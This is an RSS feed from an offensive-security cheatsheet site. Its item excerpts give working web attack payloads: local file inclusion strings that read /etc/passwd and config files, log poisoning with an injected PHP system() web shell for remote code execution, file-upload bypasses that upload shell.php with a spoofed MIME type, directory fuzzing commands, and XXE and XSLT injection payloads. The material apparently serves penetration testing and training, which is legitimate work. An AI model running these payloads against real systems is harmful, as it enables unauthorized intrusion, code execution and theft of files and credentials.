<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>File Inclusion and Injections on Offensive Security Cheatsheet</title>
    <link>/web-attacks/files-inclusions-and-injections/</link>
    <description>Recent content in File Inclusion and Injections on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/web-attacks/files-inclusions-and-injections/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Local and Remote File Inclusions</title>
      <link>/web-attacks/files-inclusions-and-injections/lfi_rfi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-attacks/files-inclusions-and-injections/lfi_rfi/</guid>
      <description>Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header &amp;#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&amp;#34; http://target # LFI to RCE Can you read for a .log file such as: C:\xampp\apache\logs\access.log ? Then go nc -nv IP 80 Then write: &amp;lt;?php system($_GET[&amp;#39;acknak&amp;#39;]);?&amp;gt; Now access the log file using the LFI and inject system command in acknak parameter !# Checking if proc/self/environ is accessible # If blank page --&amp;gt; NOPE view.</description>
    </item>
    
    <item>
      <title>File Upload</title>
      <link>/web-attacks/files-inclusions-and-injections/file_upload/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-attacks/files-inclusions-and-injections/file_upload/</guid>
      <description>File Upload are well known and kinda old PHP vulnerabilities but can still work some times  
Double Extension # If the target is only checking extension → exploit.php.jpg 
MIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F &amp;#34;file=@shell.php;type=image/gif&amp;#34; --cookie &amp;#34;...&amp;#34; &amp;#34;&amp;lt;target&amp;gt;&amp;#34; # You can also create or update the following registry key on Windows {{HKLM\SOFTWARE\Classes\.php}} # Then create a “String” type registry key and, named “Content-Type&amp;#34; and set the value “image/gif”</description>
    </item>
    
    <item>
      <title>Directory &amp; File Discovery</title>
      <link>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
      <description> Test for directory traversal  
General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ 
Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39;</description>
    </item>
    
    <item>
      <title>XML External Entity (XXE) and XSLT</title>
      <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
      <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf 
Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;# XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; 
XSLT Injection # You can execute commands through an external XML file &amp;lt;br /&amp;gt;Version: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:version&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor URL: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor-url&amp;#39;)&amp;#34; /&amp;gt; # Example &amp;lt;?</description>
    </item>
    
  </channel>
</rss>